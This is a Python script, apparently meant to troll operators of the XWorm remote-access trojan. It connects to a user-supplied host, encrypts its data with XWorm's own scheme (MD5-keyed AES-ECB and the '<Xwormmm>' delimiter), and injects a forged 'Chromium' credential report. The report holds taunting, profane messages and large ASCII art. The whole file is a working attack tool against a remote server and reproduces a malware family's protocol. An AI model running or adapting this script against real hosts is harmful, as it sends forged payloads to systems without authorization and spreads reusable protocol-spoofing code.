
from Crypto.Util.Padding import pad
from dataclasses import dataclass
from Crypto.Cipher import AES
import hashlib
import socket
import os

class TextCreationUtils:
    def aes_encryptor(input_bytes, key):
        key_hash = hashlib.md5(key.encode('utf-8')).digest() # MD5 hash of the key
        cipher = AES.new(key_hash, AES.MODE_ECB) # AES cipher in ECB mode
        padded = pad(input_bytes, AES.block_size) # Pad input to block size
        return cipher.encrypt(padded) # Return encrypted bytes

    def send_encrypted(sock, text: str, key: str): 
        encrypted = TextCreationUtils.aes_encryptor(text.encode(), key) # Encrypt the text
        header = (str(len(encrypted)) + "\0").encode() # Create header with length
        sock.sendall(header + encrypted) # Send header and encrypted data

class TextCreation:
    SPL_XCLIENT = "<Xwormmm>"
    ASCII_ART = '''
                                           .""--.._
                                           []      `'--.._
                                           ||__           `'-,
                                         `)||_ ```'--..       \\
                     _                    /|//}        ``--._  |
                  .'` `'.                /////}              `\/
                 /  .""".\              //{///    
                /  /_  _`\\\\            // `||
                | |(_)(_)||          _//   ||
                | |  /\  )|        _///\   ||
                | |L====J |       / |/ |   ||
               /  /'-..-' /    .'`  \  |   ||
              /   |  :: | |_.-`      |  \  ||
             /|   `\-::.| |          \   | ||
           /` `|   /    | |          |   / ||
         |`    \   |    / /          \  |  || ███████╗██╗   ██╗ ██████╗██╗  ██╗███████╗██████╗     ██████╗ ██╗   ██╗    ████████╗███╗   ███╗███████╗    ██╗███████╗██╗    ██╗███████╗███████╗██╗   ██╗
        |       `\_|    |/      ,.__. \ |  || ██╔════╝██║   ██║██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝    ╚══██╔══╝████╗ ████║██╔════╝   ██╔╝██╔════╝██║    ██║██╔════╝╚══███╔╝╚██╗ ██╔╝
        /                     /`    `\ ||  || █████╗  ██║   ██║██║     █████╔╝ █████╗  ██║  ██║    ██████╔╝ ╚████╔╝        ██║   ██╔████╔██║█████╗    ██╔╝ ███████╗██║ █╗ ██║█████╗    ███╔╝  ╚████╔╝ 
       |           .         /        \||  || ██╔══╝  ██║   ██║██║     ██╔═██╗ ██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝         ██║   ██║╚██╔╝██║██╔══╝   ██╔╝  ╚════██║██║███╗██║██╔══╝   ███╔╝    ╚██╔╝ 
       |                     |         |/  || ██║     ╚██████╔╝╚██████╗██║  ██╗███████╗██████╔╝    ██████╔╝   ██║          ██║██╗██║ ╚═╝ ██║███████╗██╔╝   ███████║╚███╔███╔╝███████╗███████╗   ██║  
       /         /           |         (   || ╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝     ╚═════╝    ╚═╝          ╚═╝╚═╝╚═╝     ╚═╝╚══════╝╚═╝    ╚══════╝ ╚══╝╚══╝ ╚══════╝╚══════╝   ╚═╝  
      /          .           /          )  ||                                                                 Stop being a Skid
     |            \          |             ||                                                                    t.me/swezy
    /             |          /             ||
   |\            /          |              ||
   \ `-._       |           /              ||
    \ ,//`\    /`           |              ||
     ///\  \  |             \              ||
    |||| ) |__/             |              ||
    |||| `.(                |              ||
    `\\\\` /`                 /              ||
       /`                   /              ||
      /                     |              ||
     |                      \              ||
    /                        |             ||
  /`                          \            ||
/`                            |            ||
`-.___,-.      .-.        ___,'            ||
         `---'`   `'----'`'''


    @staticmethod
    def main():
        host = input("Host > ") # Get target host
        port = input("Port > ") # Get target port
        key = input("Key > ") # Get encryption key
        sock = TextCreation.connection(host, port) # Connect to target
        TextCreation.trigger(sock, key) # Trigger the Exploit


    def connection(host, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create socket
            sock.connect((host, int(port))) # Connect to target
            print("Connected.") 
            return sock # Return the socket
        except Exception as e:
            print(f"Connection failed: {e}")
            os._exit(0) # Exit on failure

    def trigger(sock, key):
        try:
            @dataclass
            class Account:
                URL: str
                UserName: str
                Password: str
                Application: str

            account_list = [
                Account(URL="https://github.com/SwezyDev", UserName="Swezy <3", Password="I fully Exploited your PC... Enjoy the Last Minutes", Application="Fucked by Swezy <3"),
            ]

            result = []

            for account in account_list:
                result.append(f"Url: {account.URL}")
                result.append(f"Username: {account.UserName}")
                result.append(f"Password: {account.Password}")
                result.append(f"Application: {account.Application}")
                result.append("=============================")
                result.append(TextCreation.ASCII_ART)

            output_string = "\n".join(result)
            payload = f"Chromium{TextCreation.SPL_XCLIENT}ClientID{TextCreation.SPL_XCLIENT}{output_string}"
            TextCreationUtils.send_encrypted(sock, payload, key) # Send encrypted message
            print("Plugin opened.")
        except Exception as e:
            print(f"Failed to send message: {e}")

if __name__ == "__main__":
    TextCreation.main()